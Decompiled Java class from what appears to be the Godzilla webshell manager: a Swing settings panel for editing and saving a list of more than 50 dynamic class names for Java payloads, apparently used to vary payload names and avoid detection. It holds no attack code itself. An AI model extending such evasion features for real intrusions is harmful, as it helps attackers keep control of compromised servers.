/*    */ package shells.payloads.java;
/*    */ 
/*    */ import core.Db;
/*    */ import core.ui.component.RTextArea;
/*    */ import core.ui.component.dialog.AppSeting;
/*    */ import core.ui.component.dialog.GOptionPane;
/*    */ import java.awt.BorderLayout;
/*    */ import java.awt.Component;
/*    */ import java.awt.Dimension;
/*    */ import java.awt.event.ActionEvent;
/*    */ import java.io.InputStream;
/*    */ import java.util.Arrays;
/*    */ import java.util.HashSet;
/*    */ import javax.swing.JButton;
/*    */ import javax.swing.JPanel;
/*    */ import javax.swing.JSplitPane;
/*    */ import org.fife.ui.rtextarea.RTextArea;
/*    */ import org.fife.ui.rtextarea.RTextScrollPane;
/*    */ import util.Log;
/*    */ import util.automaticBindClick;
/*    */ import util.functions;
/*    */ 
/*    */ public class DynamicUpdateClass extends JPanel {
/*    */   static {
/* 25 */     AppSeting.registerPluginSeting("Java动态Class名字", DynamicUpdateClass.class);
/*    */   }
/*    */ 
/*    */   
/*    */   public static final String ENVNAME = "DynamicClassNames";
/*    */   private final RTextArea classNameTextArea;
/*    */   private final JButton updateHeaderButton;
/*    */   
/*    */   public DynamicUpdateClass() {
/* 34 */     super(new BorderLayout(1, 1));
/* 35 */     this.classNameTextArea = new RTextArea();
/* 36 */     this.updateHeaderButton = new JButton("修改");
/* 37 */     this.classNameTextArea.setText(Db.getSetingValue("DynamicClassNames", readDefaultClassName()));
/* 38 */     Dimension dimension = new Dimension();
/* 39 */     dimension.height = 30;
/* 40 */     JSplitPane splitPane = new JSplitPane();
/* 41 */     splitPane.setOrientation(0);
/* 42 */     JPanel bottomPanel = new JPanel();
/* 43 */     splitPane.setTopComponent((Component)new RTextScrollPane((RTextArea)this.classNameTextArea, true));
/* 44 */     bottomPanel.add(this.updateHeaderButton);
/* 45 */     bottomPanel.setMaximumSize(dimension);
/* 46 */     bottomPanel.setMinimumSize(dimension);
/* 47 */     splitPane.setBottomComponent(bottomPanel);
/*    */     
/* 49 */     splitPane.setResizeWeight(0.9D);
/*    */     
/* 51 */     automaticBindClick.bindJButtonClick(this, this);
/*    */     
/* 53 */     add(splitPane);
/*    */   }
/*    */ 
/*    */   
/*    */   private static String readDefaultClassName() {
/* 58 */     byte[] data = null;
/*    */     try {
/* 60 */       InputStream fileInputStream = DynamicUpdateClass.class.getResourceAsStream("assets/classNames.txt");
/* 61 */       data = functions.readInputStream(fileInputStream);
/* 62 */       fileInputStream.close();
/* 63 */     } catch (Exception e) {
/* 64 */       Log.error(e);
/*    */     } 
/* 66 */     return new String(data);
/*    */   }
/*    */   
/*    */   public static HashSet getAllDynamicClassName() {
/* 70 */     String classNameString = Db.getSetingValue("DynamicClassNames", readDefaultClassName());
/* 71 */     String[] classNames = classNameString.split("\n");
/* 72 */     HashSet<String> classNameSet = new HashSet<>();
/* 73 */     Arrays.<String>stream(classNames).forEach(name -> {
/*    */           if (name.trim().length() > 0) {
/*    */             classNameSet.add(name.trim());
/*    */           }
/*    */         });
/* 78 */     return classNameSet;
/*    */   }
/*    */   
/*    */   private void updateHeaderButtonClick(ActionEvent actionEvent) {
/* 82 */     String classNameString = this.classNameTextArea.getText();
/* 83 */     String[] classNames = classNameString.split("\n");
/* 84 */     HashSet<String> classNameSet = new HashSet<>();
/* 85 */     Arrays.<String>stream(classNames).forEach(name -> {
/*    */           if (name.trim().length() > 0) {
/*    */             classNameSet.add(name.trim());
/*    */           }
/*    */         });
/* 90 */     if (classNameSet.size() > 50) {
/* 91 */       Db.updateSetingKV("DynamicClassNames", classNameString);
/* 92 */       GOptionPane.showMessageDialog(null, "修改成功", "提示", 1);
/*    */     } else {
/* 94 */       GOptionPane.showMessageDialog(null, "ClassName 少于50个", "错误提示", 1);
/*    */     } 
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\java\DynamicUpdateClass.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */